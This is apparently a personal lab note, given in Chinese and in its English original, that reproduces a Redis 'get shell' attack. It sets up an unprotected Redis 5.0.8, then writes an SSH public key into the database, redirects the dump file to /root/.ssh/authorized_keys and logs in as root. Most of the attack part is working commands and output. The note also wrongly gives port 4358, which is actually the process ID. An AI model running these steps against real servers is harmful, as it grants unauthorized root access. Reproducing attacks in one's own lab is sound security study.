---
tags:
  - 安全
  - Linux
---

# Redis Get Shell Vulnerability Reproduction #


!!! warning "文档时效性说明"
    本文为早期笔记，可能存在版本过时、命令失效、链接失效、最佳实践变化等问题。请以官方最新文档为准。

## 部署 Redis ##

``` shell
root@server:~# wget http://download.redis.io/releases/redis-5.0.8.tar.gz
root@server:~# tar xzf redis-5.0.8.tar.gz
root@server:~# cd redis-5.0.8
root@server:~/redis-5.0.8# make
root@server:~/redis-5.0.8# make install
```

未修改 `redis.conf` 的任何内容，使用默认配置，关闭了 protected mode。

## 启动 Redis ##

``` shell
root@server:~# redis-server --daemonize yes --protected-mode no
```

查看 Redis 监听的地址

``` shell
root@server:~# netstat -tulpn | grep redis
tcp        0      0 0.0.0.0:6379            0.0.0.0:*               LISTEN      4358/redis-server *
tcp6       0      0 :::6379                 :::*                    LISTEN      4358/redis-server *
```

输出显示 Redis 正在监听 `0.0.0.0:4358`

## 关闭防火墙 ##

在 Ubuntu 服务器上：

``` shell
root@server:~# ufw disable
```

在 CentOS 服务器上：

``` shell
root@server:~# systemctl stop firewalld
```

或者也可以直接放行 4358 端口。

## 攻击步骤 ##

假设已拥有 ssh 密钥，公钥位于 `~/.ssh/id_rsa.pub`，私钥位于 `~/.ssh/id_rsa`。

无密码连接 Redis 服务器：

``` shell
[hxp@hxp-arch ~]$ redis-cli -h 142.**.***.32
```

连接成功。然后通过以下方式将 ssh 公钥推送至服务器：

``` shell
[hxp@hxp-arch ~]$ (echo -e "\n\n";cat ~/.ssh/id_rsa.pub;echo -e "\n\n") | redis-cli -h 142.**.***.32 -x set ssh-key
```

重新登录检查注入是否成功

``` shell
[hxp@hxp-arch ~]$ redis-cli -h 142.**.***.32
142.**.***.32:6379> get ssh-key
"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuQgS2UfoevBjEX7UTgpSPWx1aBHqMmynjK417hsz9UXNQNesKq/T****************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************= ********@***********\n"
142.**.***.32:6379> 
```

然后检测 Redis 以哪个用户运行

``` shell
142.**.***.32:6379> CONFIG GET dir
1) "dir"
2) "/root"
```

幸运地是 Redis 以 root 运行。

最后一步是将数据库文件设置为 `/root/.ssh/authorized_keys`，然后保存。

``` shell
142.**.***.32:6379> CONFIG SET dir /root/.ssh
OK
142.**.***.32:6379> CONFIG SET dbfilename authorized_keys
OK
142.**.***.32:6379> save
OK
142.**.***.32:6379> exit
```

之后，ssh 公钥应该被保存到 `/root/.ssh/authorized_keys`

登录服务器：

``` shell
[hxp@hxp-arch ~]$ ssh -i ~/.ssh/id_rsa root@142.**.***.32
```

成功。可以看到公钥已被插入 `/root/.ssh/authorized_keys`

``` shell
root@server:~# cat /root/.ssh/authorized_keys 
REDIS0009      redis-ver5.0.8
edis-bits@ctimex^used-mem¸
 aof-preamblessh-keyBD


ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuQgS2UfoevBjEX7UTgpSPWx1aBHqMmynjK417hsz9UXNQNesKq/T****************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************= ********@***********



=uroot@server:~# 

```

---

## 原文（English）

```
---
tags:
  - 安全
  - Linux
---

# Redis Get Shell Vulnerability Reproduction #


!!! warning "文档时效性说明"
    本文为早期笔记，可能存在版本过时、命令失效、链接失效、最佳实践变化等问题。请以官方最新文档为准。

## Deploy Redis ##

``` shell
root@server:~# wget http://download.redis.io/releases/redis-5.0.8.tar.gz
root@server:~# tar xzf Redis-5.0.8.tar.gz
root@server:~# cd Redis-5.0.8
root@server:~/Redis-5.0.8# make
root@server:~/Redis-5.0.8# make install
```

And we change nothing of `redis.conf`, using its default setting, disabling protected mode.

## Fire Up Redis ##

``` shell
root@server:~# Redis-server --daemonize yes --protected-mode no
```

See which address Redis is listening

``` shell
root@server:~# netstat -tulpn | grep Redis
TCP        0      0 0.0.0.0:6379            0.0.0.0:*               LISTEN      4358/Redis-server *
tcp6       0      0 :::6379                 :::*                    LISTEN      4358/Redis-server *
```

The output showed that Redis is listening `0.0.0.0:4358`

## Turn off Firewall ##

On Ubuntu server:

``` shell
root@server:~# ufw disable
```

On CentOS server:

``` shell
root@server:~# systemctl stop firewalld
```

Or you may allow port 4358 instead.

## Attack Procedure ##

I assume that you have already had an ssh key, and the public key is located in `~/.ssh/id_rsa.pub`, the private key is located in `~/.ssh/id_rsa`.

We connect our Redis server without password:

``` shell
[hxp@hxp-arch ~]$ Redis-CLI -h 142.**.***.32
```

The connection was successful. Then we can push our ssh key to server by

``` shell
[hxp@hxp-arch ~]$ (echo -e "\n\n";cat ~/.ssh/id_rsa.pub;echo -e "\n\n") | Redis-CLI -h 142.**.***.32 -x set ssh-key
```

Log back to see if our injection was successful

``` shell
[hxp@hxp-arch ~]$ Redis-CLI -h 142.**.***.32
142.**.***.32:6379> get ssh-key
"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuQgS2UfoevBjEX7UTgpSPWx1aBHqMmynjK417hsz9UXNQNesKq/T****************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************= ********@***********\n"
142.**.***.32:6379> 
```

Then we detect which user Redis is running as

``` shell
142.**.***.32:6379> CONFIG GET dir
1) "dir"
2) "/root"
```

Fortunately Redis is running as root.

The last thing we need to do was to set our database file to `/root/.ssh/authorized_keys`, and save.

``` shell
142.**.***.32:6379> CONFIG SET dir /root/.ssh
OK
142.**.***.32:6379> CONFIG SET dbfilename authorized_keys
OK
142.**.***.32:6379> save
OK
142.**.***.32:6379> exit
```

After that, the ssh public key should be saved in `/root/.ssh/authorized_keys`

Log in to the server:

``` shell
[hxp@hxp-arch ~]$ ssh -i ~/.ssh/id_rsa root@142.**.***.32
```

Success. And we can see that our public key is inserted in `/root/.ssh/authorized_keys`

``` shell
root@server:~# cat /root/.ssh/authorized_keys 
REDIS0009      Redis-ver5.0.8
edis-bits@ctimex^used-mem¸
 aof-preamblessh-keyBD


ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuQgS2UfoevBjEX7UTgpSPWx1aBHqMmynjK417hsz9UXNQNesKq/T****************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************= ********@***********



=uroot@server:~# 

```
```